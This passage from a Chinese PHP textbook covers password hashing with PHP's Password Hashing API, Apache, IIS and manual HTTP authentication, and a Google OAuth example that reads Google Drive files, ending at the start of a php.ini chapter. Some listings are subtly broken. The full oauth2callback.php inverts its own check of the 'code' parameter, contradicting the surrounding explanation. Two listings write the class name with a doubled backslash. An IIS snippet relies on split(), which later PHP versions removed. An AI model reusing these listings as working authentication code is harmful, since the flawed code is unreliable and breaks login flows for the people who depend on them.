}
?>
```

### 清单 32.10 使用验证码的代码 ("captcha-code.php")

### 图 32.10 使用中的验证码

## 32.8 加密密码

最后，我们将探讨另一个PHP也很好地涵盖的安全问题，即使底层编程错误不如XSS、SQL注入或CSRF那么明显。这里的主题是密码的安全存储。近期（甚至更久远）过去的无数案例表明，许多公司在数据存储方面非常不谨慎。Have I Been Pwned网站（https://haveibeenpwned.com）是一个知名资源，在重大访问数据被盗案例中始终活跃，并提供一项测试，告诉您自己的电子邮件地址是否已被成功窃取。

### 图 32.11 Have I Been Pwned

成功入侵的原因有很多——例如，SQL注入或仅仅是公司内部人员访问并转发数据。这里密码特别值得关注。如果这些密码以明文形式存储在数据库中，灾难将达到极致。因此，加密是至关重要的。然而，这里也存在潜在的缺点：Web应用程序可能需要再次解密数据，例如在进行登录尝试时。如果攻击者成功从应用程序读取数据，他们可能也可以访问应用程序本身，因此可以访问密钥。

因此，多年前许多Web应用程序就采用了不存储密码，而仅存储一种指纹的做法。从此指纹中无法再恢复密码。然而，当用户登录应用程序时，Web应用程序会从指定的密码创建一个新指纹。这与保存的指纹相同，登录即可成功。

然而，如果攻击者访问应用程序的数据库，他只拥有指纹，而没有“真实”密码。尽管攻击成功了，但在其他地方使用相同密码的任何人确实都必须在几秒钟内更改它（但不应花费太长时间）。

然而，用于指纹的方法至关重要——过去，通常使用MD5（及其PHP函数 md5()）和SHA1（或PHP中的 sha1()）。此过程已有一段时间不再安全；可以使用标准硬件并在相对较短的时间内从MD5哈希（即所称的指纹）中恢复密码——或者可以确定另一个具有相同MD5哈希的密码。稍微安全一些的SHA1变体能抵抗解密更长时间，但这种方法现在也被认为已被攻破。

当然，还有其他加密和哈希机制，但即使在PHP中，它们也一直有点笨拙。因此，有了Password Hashing API。关于此内置扩展的所有信息可在 http://php.net/password 上找到。您无需任何配置或进一步的设置步骤即可使用此功能。在内部，所提供的功能依赖于强大的 crypt() 函数，但Password Hashing API本身将所有内容浓缩为四个单独的函数：

- password_hash()
  - 从输入（如密码）生成哈希
- password_verify()
  - 检查输入是否与哈希匹配
- password_get_info()
  - 提供关于哈希的信息
- password_needs_rehash()
  - 检查哈希是否具有某些属性

前两个函数是最重要的。过程相对简单：使用 `password_hash()` 生成哈希。除了输入本身外，还必须指定要使用的算法；PHP提供两个常量，`PASSWORD_DEFAULT`（默认情况下，这是 `bcrypt`，但未来的PHP版本中可能会更改）和 `PASSWORD_BCRYPT`。

这是一个示例：

```php
password_hash("top secret", PASSWORD_DEFAULT);
```

以下是可能的输出：

```
$2y$10$Bz8Kut2TCB17TfOYzLBHMugxG2eOBSYXI1vFcZrkp9hNo/1UwzOtu
```

此哈希现已存入数据库；从此无法看到密码。但是，我们可以使用 `password_verify()` 来检查输入是否与哈希匹配：

```php
password_verify("top secret", "$2y$10$Bz8Kut2TCB17TfOYzLBHMugxG2eOBSYXI1vFcZrkp9hNo/1UwzOtu");
```

返回值则不出所料地为 true。这样一来，例如，您可以调整 *第15章，清单15.6* 中的登录逻辑。

作为 `password_hash()` 的第三个参数，您可以使用关联数组指定加密选项：cost，即生成哈希值的算法成本。越高越好，但计算时间越长。10是默认值，但只要性能良好，也可以增加它。

以下是这方面的一个小示例：

```php
password_hash("top secret", PASSWORD_BCRYPT, ["cost"=>15]);
```

例如，此代码在一次测试运行中生成了以下返回值——等待几秒钟后：

```
$2y$15$LyWFa9f0JQB81Cfh1bN9KumpOXY0tKgfw8br3j1Qzt7.eStTPGBjG
```

如您所见，哈希还包含有关算法和成本的信息。其余部分即为实际哈希。

**注意**

在过去，还可以指定 *盐* 值——即附加到要哈希的字符串上的“盐”，以使哈希更难以追踪。PHP每次都会使用随机且安全的盐值，因此此配置选项已在PHP 8中移除。

这让您可以使用一个非常简单的API，它仍能安全地加密密码。MD5和SHA1哈希已不再足够。





> **提示**
> 加密的标准 PHP 扩展是 Sodium。它已随 PHP 包含，在 Linux 中需要 `--with-sodium` 配置开关，在 Windows 中需要 `php.ini` 中的 `extension=sodium` 条目。和往常一样，更多信息可以在 [PHP 手册](https://www.php.net/sodium) 中找到。

本章涵盖的主题只是 Web 应用程序中潜在安全漏洞的冰山一角。但如果你至少养成检查所有用户输入的习惯，许多潜在危险就可以避免。再说一次，服务器日志通常会提供线索，说明坏人如何入手以及他们在哪里寻找漏洞。不过，一般来说，你应该始终领先攻击者一两个步骤。

# 第 33 章 身份验证

*安全是当今世界最重要的 IT 话题之一。这是一件好事。用户身份验证是这里的关键问题。*

安全的一部分当然是安全编程；你可以在第 32 章中阅读更多相关内容。但本章是关于开发人员也经常面临的一项任务：在网站上识别用户并授予他们授权。

> **注意**
> *身份验证* 和 *授权* 这两个术语有时被混用。按定义，这是不正确的：身份验证是关于识别用户；授权是关于授予用户权限。在 Web 上，这通常是一个步骤：用户登录并因此获得访问权限。但是，授权也可以涉及分配权限，例如在角色系统中。在这种情况下，用户经过身份验证并获得不同级别的权限。

本章的重点是身份验证。有几种选择：

- **Web 服务器提供的身份验证**
  Apache 在这里提供了一种广泛使用的选项。IIS 也提供类似的功能，尽管在实践中很少使用。

- **手动设置 HTTP 身份验证**
  虽然 HTTP 协议的这种机制也被 Apache 用于其自身身份验证，但你也可以使用 PHP 独立于 Web 服务器来控制 HTTP 身份验证。

- **基于会话的身份验证**
  你将在第 15 章中了解会话。当还需要授权时，此第三种方案始终会发挥作用。由于它直接在 PHP 中实现，因此也独立于环境——即 Web 服务器及其配置。

- **基于标准的身份验证**
  这指的是所有基于 OIDC 和 OAuth 等当前标准的身份验证程序。当多个应用程序想要登录到一个中心位置（即所谓的身份提供程序）时，它们的时代就到了。

本章将介绍前两种选项，并以 Google 身份提供程序的基于标准的身份验证小示例为例。最后，我们将得出一个结论，其中也包括会话身份验证。

## 33.1 Apache 身份验证

Apache 提供了一种简单的用户身份验证形式，在实践中也经常使用。整个配置的核心是 .htaccess 配置文件。或者，配置也可以直接在 Web 服务器配置中全局或针对特定 VHost 定义。

> **注意**
>
> 在 Windows 中，要创建一个没有名称且只有扩展名的文件非常麻烦。在那里，`.htaccess` 通常用作文件名。但是，你必须在主 Apache 配置文件 `httpd.conf` 中更改此设置。你可以在 `conf` 文件夹中找到此文件。在那里查找 `AccessFileName`，然后输入 `.htaccess` 文件的新名称：
>
> `AccessFileName ht.access`
>
> 如果只有你的测试计算机运行 Windows 而生产系统运行 Linux，请小心。然后你通常必须将文件名改回 `.htaccess`！如果你的网站由主机托管，尤其如此。

基本原理非常简单：当访问受保护的目录时，Apache 会向浏览器发送未授权的响应（消息 401）并发送 WWW-Authenticate 标头，说明使用哪种身份验证方法（`basic`（未加密）或 `digest`（已加密））。然后浏览器会要求用户输入用户名和密码，并将两者都发送到服务器，服务器随后确认登录。在服务器上，`.htaccess` 文件（在 Windows 中为 `ht.access`）控制身份验证。所有用户名和密码都可以在包含用户名的文件中找到。

现在来实现整个流程：

1. 首先，将 `.htaccess`（或 `ht.access`）文本文件放置在要保护的目录中。子目录也包含在保护范围内。

2. 现在需要填写文本文件。首先访问包含用户名和密码的文件：

```
AuthUserFile path/.htpasswd
```

> 浏览器的行为略有不同。例如，并非每个浏览器都会打开模态窗口来输入用户名和密码；它们有时会将其集成到浏览器窗口中。在输入错误的情况下也存在差异：Internet Explorer 在三次尝试后中止，而使用 Firefox 时，你可以无限次尝试。

要创建此文件，Apache 提供了一个名为 htpasswd 的工具。在 Linux 和 Windows 中，可以在 Apache 的 bin 目录中找到它。

3. 在控制台中（在 Windows 上：命令提示符），切换到 Apache 的 bin 目录，并使用第一个用户创建新密码文件：

```
htpasswd -cm .htpasswd user
```

配置缩写 -c 表示新文件，m 表示密码的 MD5 加密。这是 Windows 下的标准。其后跟文件名，最后是第一个用户。可以通过不带任何参数调用 htpasswd 来查找其他参数。

4. 现在系统会要求你输入用户的密码，并必须再次确认。

5. 然后输入其他用户（参见图 33.1）：

```
htpasswd -m .htpasswd user2
```

![](img/ae7820c36e8f24c1623d26668b28e80e_895_0.png)

图 33.1 Windows 中 "htpasswd" 的两个用户条目

6. 将文件复制到要保护的目录中。小心：该目录不能从外部轻易访问，否则即使是最好的密码也无济于事！

7. 回到 .htaccess（或 ht.access），接下来是身份验证的名称。这通常是应用程序的名称：

```
AuthName "Application XY PHP"
```

8. 然后指定身份验证类型。基本身份验证是标准。摘要身份验证也偶尔使用，但它在较旧版本的 Internet Explorer 中无法工作。基本身份验证通过网络以未加密形式发送，而摘要身份验证使用加密：

```
AuthType Basic
```

从 Apache 2.2 开始，还需要以下行：

```
AuthBasicProvider file
```

> **注意**
> .htaccess 中条目的顺序没有规定。

9. require 语句放在最后：

```
require valid-user
```

它说明身份验证发生时必须满足什么条件。使用 valid-user，每个用户都必须输入正确的用户名和密码。图 33.2 显示了用户的身份验证输入界面。

![](img/ae7820c36e8f24c1623d26668b28e80e_896_0.png)

图 33.2 Apache 要求身份验证

10. 现在将 httpd.conf Apache 配置文件中根目录或应用程序目录的 AllowOverride 设置从

```
AllowOverride None
```

更改为

```
AllowOverride AuthConfig
```

现在有几个更多的设置选项。与其使用 require valid-user 允许所有用户访问，不如限制某些用户的访问：

```
require user user2
```

你也可以只允许某些类型的访问：

```
<Limit GET POST>
require user nutzer
require user nutzer2
</Limit>
```

> **注意**
>
> 注意：在这种情况下，其他 HTTP 动词不会被阻止，而是被启用！或者，你也可以使用 `<LimitExcept>`，在这种情况下，访问控制将在所有列出的方法之外的方法上执行。

除了用户管理外，你还可以创建组。这需要以下步骤：

1. 在 .htaccess（或 ht.access）文件中，添加相应文件的规范：

```
AuthGroupFile Path/.htgroup
```

2. 然后在文本编辑器中创建此文件。它包含组名，后跟一个冒号。随后是属于该组的所有用户名。注意，用户当然必须在普通用户文件（这里是 .htpasswd）中存在并设置密码！

```
managers: user user2
```

> **注意**
>
> 包含组成员的行最大大小为 8 KB。但是，你可以轻松地在下一行使用相同的用户名继续：
>
> staff: many
> staff: even_more

3. 现在回到 .htaccess（ht.access）。在那里输入一个（或多个）组：

```
require group projectmanager
```

顺便说一句，尽管有组，你仍可以指定单个用户——例如：

```
require user admin
```

> **注意**
>
> 如果有大量密码，在文本文件中管理它们就不再合理了。然后可以使用 Apache 模块将用户名和密码存储在数据库中。最著名的替代方案是 `mod_auth_dbm`，用于存储在 DBM 数据库中。





## 33.2 IIS 身份验证

Internet Information Services (IIS) 是 Windows 中的 Microsoft 标准 Web 服务器。在生产系统中，通常 IIS 用于 Windows 机器，而不使用 Apache。IIS 提供一系列身份验证选项。但是，其中一些不适用于 Web 使用。例如，通过 Kerberos 的集成 Windows 身份验证仅适用于内联网，因为客户端和服务器应属于同一个域。

这里可以考虑使用您已从 Apache 了解的基本身份验证（标准身份验证）和摘要身份验证。IIS 使用相同的 HTTP 功能。IIS 与 Apache 相比的主要缺点是身份验证使用现有的 Windows 用户帐户。无论相关列表存储在何处，这都需要一定的精力。

> **注意**
> 
> 例如，图书馆系统中使用的一种方法是 IP 识别。仅允许在用户自己的页面上使用预先定义的 IP 范围。此身份验证可以实现带或不带密码验证。但是，对于具有灵活 IP 地址的用户，这永远没有意义。大多数互联网服务提供商都属于这种情况。此外，例如，一位教授只有在当前处于大学网络内时才能查看他的书籍。如果他在参加会议，那么该系统对他就无用了。

要在 IIS 中使用标准身份验证，需要执行以下步骤：

- 1. 首先，您需要启用基本身份验证。转到 **启用或关闭 Windows 功能**。您可以在 **控制面板 • 程序和功能** 中找到它。
- 2. 转到 **万维网服务 • 安全** 并激活 **基本身份验证**。
- 3. 打开 **Internet Information Services (IIS) 管理器**。您可以在 **控制面板** 中找到它。
- 4. 在 **连接** 窗格中，展开服务器名称，展开 **站点**，然后单击要为其启用基本身份验证的站点。
- 5. 单击 **身份验证** 并启用 **基本身份验证**。
- 6. 下一步，必须禁用 **匿名身份验证**。

您现在可以根据需要为该目录添加用户或用户组。在配置中，`<basicAuthentication>` 现在可用。要使用摘要身份验证，必须切换到用户帐户，并为其中一个用户选择可逆加密。

![](img/ae7820c36e8f24c1623d26668b28e80e_899_0.png)

图 33.3 已激活基本身份验证

## 33.3 手动 HTTP 身份验证

不将 HTTP 身份验证交给服务器具有多个优势：

- 您无需费心处理文本文件或使用 Apache 并不那么简单的数据库功能，而是可以使用 PHP 控制一切。
- 与 IIS 相比，您的优势在于无需使用用户帐户。
- 您可以（相对）独立于 Web 服务器进行工作。

HTTP 身份验证实现起来很快。您还记得 HTTP 身份验证开始时会发生什么吗？浏览器会收到 HTTP 消息 401，您可以使用 PHP 输出：

```
header("WWW-Authenticate: Basic realm=\"Application XY PHP\"");
header("HTTP/1.1 401 Unauthorized");
```

> **注意**
> 
> 注意：在某些配置中，尤其是与 IIS 结合使用时，上述代码行可能无效！在这种情况下，稍微修改的 HTTP 标题通常有帮助：
> 
> header("WWW-Authenticate: Basic realm=\"Application XY PHP\"");
> header("Status: 401 Unauthorized");

查询将出现（参见图 33.4），但当然仍然没有密码检查。您可以通过 `$_SERVER` 环境变量访问用户名和密码，然后使用 `$_SERVER["PHP_AUTH_USER"]` 和 `$_SERVER["PHP_AUTH_PW"]`。这样可以非常快速地实现密码检查。以下清单显示了一个简单的脚本；图 33.5 显示了输出。

```
<?php
if (isset($_SERVER["PHP_AUTH_USER"]) &&
    $_SERVER["PHP_AUTH_USER"] == "test" &&
    $_SERVER["PHP_AUTH_PW"] == "secure") {
    echo "Authentication worked, welcome! ";
    echo $_SERVER["PHP_AUTH_USER"];
} else {
    header("WWW-Authenticate: Basic realm=\"Application XY PHP\"");
    header("HTTP/1.0 401 Unauthorized");
}
?>
```

清单 33.1 使用 HTTP 进行用户身份验证（“authenti_http.php”）

![](img/ae7820c36e8f24c1623d26668b28e80e_900_0.png)

图 33.4 查询出现

仅针对一个用户名使用简单的 if 语句进行检查是最简单的变体。但是，您也可以编写自己的身份验证类，在其后添加数据库，等等。原理不会改变。

> **注意**
> 
> 测试时，必须牢记，浏览器会在页面每次被调用且关闭之前，都提供第一次输入的用户名和密码。因此，要测试一个变体，您必须关闭浏览器，或者只需更改所需密码。在后一种情况下，将返回“未经过身份验证”，因为旧的浏览器密码不再正确，用户可以重新输入它。

![](img/ae7820c36e8f24c1623d26668b28e80e_901_0.png)

图 33.5 身份验证成功

使用 IIS 时，这种身份验证可能会出现困难。重要的是，您已关闭集成 Windows 身份验证，因为它始终优先于标准身份验证（包括手动 HTTP 身份验证）。如果不这样做，即使您正确输入了用户名和密码，也会不断被要求输入。匿名访问是唯一不干扰的选项，因为它处于从属地位。

IIS 反复报告一些特殊功能和问题。以下是出现问题时您应该了解的最重要要点：

- `$_SERVER` 环境变量存在问题。对于某些 IIS/PHP 组合，返回的不是 `$_SERVER["PHP_AUTH_USER"]` 和 `$_SERVER["PHP_AUTH_PW"]`，而只是 `$_SERVER["HTTP_AUTHORIZATION"]`，其中包含用户名和密码。您可以使用以下构造同时筛选出两者：

```
$data = split(":", base64_decode(substr($_SERVER["HTTP_AUTHORIZATION"], 6)));
$user = $data[0];
$pass = $data[1];
```

- 您在冒号处分解解码后的字符串。字符串仅从第六个字符开始，因为前五个字符包含身份验证方法，即 Basic。

- 有时还建议在 IIS（网站 • 属性 • ISAPI 筛选器）中将 PHP ISAPI 模块作为筛选器安装。

## 33.4 基于标准的身份验证

基于标准的身份验证在 Web 上已经取得胜利数年。原因是 Web 架构正在快速变化。以前，一家公司通常只有一个作为客户登录的中心 Web 应用程序的单一网站，而现在许多公司除了必备的网站之外，还为客户提供客户门户、在线商店、电子学习系统等更多服务。而且所有这些应用程序都需要用户登录。那么，将用户身份验证外包给一个名为 *身份提供者* 的独立服务，还有什么比这更明显的做法呢？

**注意**

为多个应用程序使用相同的登录通常称为 *单点登录*（SSO）。需要注意的是：只有当用户在切换应用程序时不需要多次登录时，才算是“真正的”单点登录。

除了对真实用户进行身份验证外，通过编程接口（API）交换数据也需要身份验证和授权选项。让我们来看看一些最重要的标准：

- *OAuth 2.0* ([http://s-prs.co/v602292](http://s-prs.co/v602292)) 是身份验证和授权的基本标准。最初是为 API 客户端身份验证开发的，现在也与 OIDC 配合用于用户身份验证。
- *OpenID Connect*（OIDC；[http://s-prs.co/v602293](http://s-prs.co/v602293)）规范身份数据的结构和交换。数据交换基于 REST 原则，JSON 作为数据格式。可以说，OIDC 基于 OAuth。
- *JSON Web Token*（JWT；[http://s-prs.co/v602294](http://s-prs.co/v602294)）定义了如何为 OAuth 定义令牌的结构。
- *安全断言标记语言*（SAML；[http://s-prs.co/v602249](http://s-prs.co/v602249)）是基于 XML 的标准，用于定义身份验证和授权数据的结构。

作为基于标准的身份验证的示例，本章中我们使用 Google 的一个身份提供者。Google 在这里提供以下基本选项：

- 一个通过 Google Login 使用名为 *Google 登录* 的现成客户端用户登录。此处的功能是一个“使用 Google 登录”选项。
- 一个完整的身份验证 API，其技术基础为 OIDC、OAuth 和 JWT。这可以很好地在服务器端的 PHP 中使用。

在我们的示例中，我们为 Google API 使用基于 OAuth 的身份验证。在内部，Google 使用其自身的用户身份验证。

> **注意**
> 
> 如果您不想只是对接基于标准的身份提供者，而是想设置自己的身份提供者，那么在 PHP 世界中也可以找到许多解决方案。但是，其中许多是特定 PHP 框架的一部分。OIDC 的独立解决方案是 phpOIDC ([http://s-prs.co/v602250](http://s-prs.co/v602250))。OAuth 服务器的良好概述可以在 [https://oauth.net/code/php](https://oauth.net/code/php) 上找到。





### 33.4.1 准备 Google 项目

此处实现的示例基于 Google 非常丰富的 API 库中的一个标准示例。它提供对 200 多个 Google API 的访问。对于本示例，我们使用 Google Drive API 来访问用户在其 Google Drive 中的文件，前提是用户使用我们的应用程序进行身份验证并授予我们这些 API 权限。

### 创建项目

Google 中每个 API 查询的基础是您在 Cloud Console 中创建的 API 项目：_https://console.cloud.google.com_。您只需要一个 Google 帐户。只要您仅将项目用于测试目的，一切均保持免费。您可以免费创建总共十二个此类项目。

![](img/ae7820c36e8f24c1623d26668b28e80e_903_0.png)

图 33.6 创建项目

下一步，为项目命名。如果您已使用 Google 组织，也可以将项目分配给该组织，但这里不是必须的。

### 创建凭据

项目创建后，您可以随时在云平台标头中访问它。下一步，我们需要一些与安全相关的登录详细信息用于 API 访问。您可以在菜单 **API 与服务 • 登录数据** 下找到它们。

让我们仔细看一下。我们将从 _API 密钥_ 开始，它是访问的基础，允许 Google 将 API 查询分配到您的帐户（并且在商业用例中还会向您收费）。您也可以出于安全原因使用它来限制 API 访问。对于服务器端查询（例如本示例）而言，这样做很有意义，因为它仅允许来自您自己的服务器 IP 地址或 IP 地址的访问。

![](img/ae7820c36e8f24c1623d26668b28e80e_904_0.png)

图 33.7 项目名称

![](img/ae7820c36e8f24c1623d26668b28e80e_904_1.png)

图 33.8 创建登录数据的界面

但是，API 密钥目前与身份验证尚无直接关系。为此，您需要创建所谓的 OAuth 客户端 ID。对于您希望用来访问 API 的每个应用程序或移动应用，Google 都期望这样一个客户端 ID。对于我们的示例，我们为应用程序类型选择 Web 应用程序，因为我们想要使用 PHP 通过 Web 访问该应用程序。

OAuth 客户端 ID 由几个组件组成：首先是客户端 ID 本身，其次是客户端密钥或客户端密码。我们需要这两个数据用于我们的 PHP 应用程序，以便以后能够通过 OAuth 访问我们项目中的 API（即 Google Drive API）。要使用它们，Google 提供了一个方便的功能：一旦您创建了客户端 ID，凭据视图中就会出现一个下载图标。下载将提供一个已完成的 JSON 文件，其中包含与项目和应用程序相关的数据：

```json
{
 "web":
 {
 "client_id": "xyz.apps.googleusercontent.com",
 "project_id": "rheinwerk-php",
 "auth_uri": "https://accounts.google.com/o/oauth2/auth",
 "token_uri": "https://oauth2.googleapis.com/token",
 "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
 "client_secret": "xyz"
 }
}
```

默认情况下，JSON 文件使用客户端 ID 作为其名称。为简单起见，我们将其重命名为 client_secrets.json。

> 注意
>
> OAuth 客户端 ID 中的 Authorized Redirect URIs 设置背后隐藏着另一个安全功能。在这里，您应该输入用户授权后 Google 应该重定向到的所有地址。在我们的例子中，这将是本地地址：http://localhost/php/oauth2callback.php。如果忽略此项，在用户重定向过程中测试时您将收到相应的错误消息。

### 配置同意屏幕

由于您的应用程序稍后将要求用户同意通过 API 访问其数据，因此您仍需在 Google 项目中处理所谓的同意屏幕（也称为用户同意屏幕）。事实上，Google 甚至强制要求您在创建第一个 OAuth 客户端 ID 之前这样做。

项目的许多重要设置都隐藏在批准屏幕后面：首先，您定义哪些用户可以访问项目。仅当您将 Google 用作公司内部平台时，内部用户才可行。**外部** 是我们示例的正确选择。只要您只想进行测试，则必须在第三步中单独指定用户。当您的项目以后准备上线时，它将经历 Google 的审批流程。

![](img/ae7820c36e8f24c1623d26668b28e80e_906_0.png)

图 33.9 同意屏幕的设置还规定了哪些用户使用该应用程序

在测试用例中，您可以将名称、支持电子邮件和各种重要链接等基本应用程序信息保持非常简短，或者只需留空，强制字段除外（由星号指示）。

这些区域本质上是对某些用户个人资料数据的授权，例如 ../auth/userinfo.email 中的电子邮件地址。

现在还缺少测试用户。在最简单的情况下，请使用创建项目时所用的同一 Google 帐户。

### 激活 API

最后，您现在必须激活 Google Drive API。为此，请在 **API 与服务** 下找到 **启用 API 与服务** 按钮。它会进入一个搜索区域，您可以在其中搜索任何 API 然后将其激活。在我们的例子中，我们要查找的是 Google Drive。

![](img/ae7820c36e8f24c1623d26668b28e80e_907_0.png)

图 33.10 添加至少一个测试用户 — 很可能是您自己的 Google 帐户

![](img/ae7820c36e8f24c1623d26668b28e80e_907_1.png)

图 33.11 为 Google Drive 激活所需的 API

### 33.4.2 通过 PHP 访问

幸运的是，Google 为其 API 提供了自己的库，即 Google API PHP Client。它支持整个 Google API 宇宙。您可以在 [http://s-prs.co/v602251.](http://s-prs.co/v602251.) 上找到它。

### 安装

客户端已经为 PHP 8 设计。当前版本的安装也可以简单地通过 Composer 进行：

```bash
composer require google/apiclient:"^2.18"
```

或者在 `composer.json` 中：

```json
{
   "require": {
       "google/apiclient": "^2.18"
   }
}
```

但是请注意：由于支持如此多的 API，安装需要一点时间，并且大量 API 类最终会出现在服务器上。Google 只允许通过 Composer 清理来设置相关的 API。以下是仅包含 Google Drive 的示例：

```json
{
   "require": {
       "google/apiclient": "^2.18"
   },
   "scripts": {
       "post-update-cmd": "Google\\Task\\Composer::cleanup"
   },
   "extra": {
       "google/apiclient-services": [
           "Drive"
       ]
   }
}
```

### 流程

本示例包含两个文档：

- google_oauth2_drive.php 包含对 Drive API 的实际访问，但会重定向到 oauth2callback.php 进行身份验证。
- oauth2callback.php 使用 Google 的 OAuth 身份提供者进行自我身份验证，并在 code URL 参数中接收一个代码。然后该文件从 Google 检索访问令牌并将其返回到 google_oauth2_drive.php。使用此令牌，google_oauth2_drive.php 然后可以访问 Drive 服务。

如果一切正常并且用户正确进行身份验证并授权我们的应用程序，那么该过程从上到下按时间顺序如下：

```
google_oauth2_drive.php
-> oauth2callback.php
-> <url target="https://accounts.google.com/o/oauth2/auth">
  https://accounts.google.com/o/oauth2/auth</url>
<- receives parameter "code"
  -> Authenticates with "code" & gets access token from Google
<- receives access token
-> Access to the Google Drive service via access token
```

![](img/ae7820c36e8f24c1623d26668b28e80e_909_0.png)

图 33.12 用户选择他的 Google 帐户

### "google_oauth2_drive.php"

现在让我们仔细看看代码。在第一步中，我们通过 Composer 获取 Google API 客户端：

```
require_once 'vendor/autoload.php';
```

然后脚本启动一个会话，以便 Google 提供的访问令牌稍后可以在脚本之间保存：

```
session_start();
```

然后我们初始化 Google API 客户端。它从 client_secrets.json 文件接收其基本数据：

```
$client = new Google\Client();
$client->setAuthConfig('client_secrets.json');
```





现在，每个要使用的 Google API 都必须添加。这里仅添加 Google Drive：

```php
$client->addScope(Google_Service_Drive::DRIVE_METADATA_READONLY);
```

核心是一种情况区分，用于检查访问令牌是否已存在。当用户首次调用时，它可能尚不存在。因此，在 else 分支中，用户会被重定向到 oauth2callback.php，实际的 Google OAuth 身份提供商身份验证将在那里进行：

```php
if (isset($_SESSION['access_token'])) {
    //access to the service
} else {
    $redirect_uri = 'http://localhost/php/oauth2callback.php';
    header('Location: ' . filter_var($redirect_uri, FILTER_SANITIZE_URL));
}
```

最后，是 if 分支：在这种情况下，访问令牌已经存在，因此我们的应用程序有权访问 Google Drive 服务。为此，只需为 Drive API 初始化一个新对象：

```php
$client->setAccessToken($_SESSION['access_token']);
$drive = new Google_Service_Drive($client);
```

然后通过 files 集合使用空安全运算符来访问文件信息。接着是简单的输出：

```php
$files = $drive?->files?->listFiles()?->getFiles();
foreach ($files as $file) {
    echo $file->getName();
    echo '<br />';
    echo $file->getMimeType();
    echo '<br /><br />';
}
```

以下代码清单显示完整代码。

```php
<?php
require_once 'vendor/autoload.php';

session_start();

$client = new Google\\Client();
$client->setAuthConfig('client_secrets.json');
$client->addScope(Google_Service_Drive::DRIVE_METADATA_READONLY);

if (isset($_SESSION['access_token'])) {
    $client->setAccessToken($_SESSION['access_token']);
    $drive = new Google_Service_Drive($client);
    $files = $drive->files->listFiles()->getFiles();

    foreach ($files as $file) {
        echo $file->getName();
        echo '<br />';
        echo $file->getMimeType();
        echo '<br /><br />';
    }
} else {
    $redirect_uri = 'http://localhost/php/oauth2callback.php';
    header('Location: ' . filter_var($redirect_uri, FILTER_SANITIZE_URL));
}
?>
```

### 清单 33.2 访问 Google 服务 ("google_oauth2_drive.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_911_0.png)

图 33.13 转发步骤后，脚本读取 Google Drive 上的文件

### "oauth2callback.php"

oauth2callback.php 的第一部分与 google_oauth2_drive.php 相对应。加载 Google API 客户端后，我们启动会话并初始化客户端。

接下来是决定性的情况区分。如果 Google 已经正确验证并授权了我们的应用程序，那么 Google 将返回一个 code URL 参数：

```php
if (!isset($_GET['code'])) {
    // Not authenticated
} else {
    // Authenticated -> back to google_oauth2_drive.php
}
```

如果不存在此参数，我们将生成授权 URL 并重定向到此 Google URL：

```php
$auth_url = $client->createAuthUrl();
header('Location: ' . filter_var($auth_url, FILTER_SANITIZE_URL));
```

Google API 客户端在此使用 client_secrets.json 中指定的 URL 作为基础。

现在在第二种情况下，code 参数已设置。在这种情况下，我们将客户端返回的访问令牌保存在会话变量中：

```php
$client->authenticate($_GET['code']);
$_SESSION['access_token'] = $client->getAccessToken();
```

然后你将被重定向回 google_oauth2_drive.php：

```php
$redirect_uri = 'http://localhost/php/google_oauth2_drive.php';
header('Location: ' . filter_var($redirect_uri, FILTER_SANITIZE_URL));
```

![](img/ae7820c36e8f24c1623d26668b28e80e_912_0.png)

图 33.14 调用在 API 项目中可见

以下代码清单一目了然地显示完整源代码。

```php
<?php
require_once 'vendor/autoload.php';
session_start();

$client = new Google\\Client();
$client->setAuthConfigFile('client_secrets.json');
$client->setRedirectUri('http://localhost/php/oauth2callback.php');
$client->addScope(Google_Service_Drive::DRIVE_METADATA_READONLY);
if (isset($_GET['code'])) {
    $auth_url = $client->createAuthUrl();
    header('Location: ' . filter_var($auth_url, FILTER_SANITIZE_URL));
} else {
    $client->authenticate($_GET['code']);
    $_SESSION['access_token'] = $client->getAccessToken();
    $redirect_uri = 'http://localhost/php/google_oauth2_drive.php';
    header('Location: ' . filter_var($redirect_uri, FILTER_SANITIZE_URL));
}
?>
```

### 清单 33.3 授权脚本 ("oauth2callback.php")

### 33.5 结论

选择身份验证方法时，最重要的是安全性、性能和易用性。所有概述的解决方案都必须以此为标准：

- 如果用户数量不太多，Apache 中带 .htaccess 的 HTTP 身份验证非常易于使用。如果使用 SSL 进行基本身份验证或直接使用摘要式身份验证，则它是安全的。但是，在后一种情况下，浏览器被排除在外，这很少是发明者的本意。性能尚可；SSL 或摘要式身份验证会使整体速度稍慢。

- 基于 IIS 的身份验证的主要负面方面是通过用户账户进行繁琐的管理。在实际应用中几乎不使用。

- 手动 HTTP 身份验证比 Web 服务器身份验证灵活得多。例如，不需要备份整个目录。数据库解决方案也更适合 PHP 应用程序。在不使用 SSL（无法使用摘要式身份验证）传输时，与所有 HTTP 身份验证变体一样，存在用户名和密码在传输过程中未受保护的问题。

- 通过会话进行身份验证是独立 Web 应用程序最灵活的解决方案。例如，可以在此基础上实现完整的权限系统。这就是为什么大多数基于 PHP 的应用程序（例如内容管理系统、商店等）都在使用它。但是，它的缺点是您必须使用 cookie 或保护 URL。带有身份验证模块的 PHP 框架在此很有帮助。

- 其他类型的身份验证，例如对 IP 区域的访问限制或集成式 Windows 身份验证，有其应用领域——主要是在内联网中——但对于以最终客户为目标群体的 Web 应用程序几乎不适用。

- 标准化身份验证始终用于当前应用程序与身份验证需要相互独立运行的情况，因为身份验证需要为不同的应用程序提供，或者使用通用身份验证（例如来自 Google）。在这种情况下，对所谓身份提供商的身份验证是通过 OIDC 和/或 OAuth 等标准以及 JWT 或 SAML 等传输格式来实现的。优势显而易见：应用程序、用户管理和身份验证彼此解耦，单点登录应用程序成为可能。唯一的（较小）反对理由是，与其他方法相比，初始创建以及（如果身份提供商负责）身份验证服务的运营工作量略有增加。

# 第 34 章
# php.ini 配置选项

几乎所有 PHP 设置都位于 php.ini 文件中。本章解释了配置的背景，并带你了解可用选项。

php.ini 文件是配置 PHP 时的中心联系点。在本章中，我们将逐一介绍标准 php.ini 文件，并简要评论关键点。我们还将查看哪里可以进一步配置选项。

## 34.1 在哪里配置？

php.ini 文件不是配置 PHP 的唯一位置。关于此配置文件的位置，还有几种选择。

### 34.1.1 存储位置

提到 php.ini 文件时，首先出现的问题是安装位置。根据操作系统，通常位置各不相同：

- 在 Windows 中，php.ini 文件位于 PHP 目录中，或（尤其在早期版本中）位于 Windows 目录中——通常在 C:\WINDOWS。
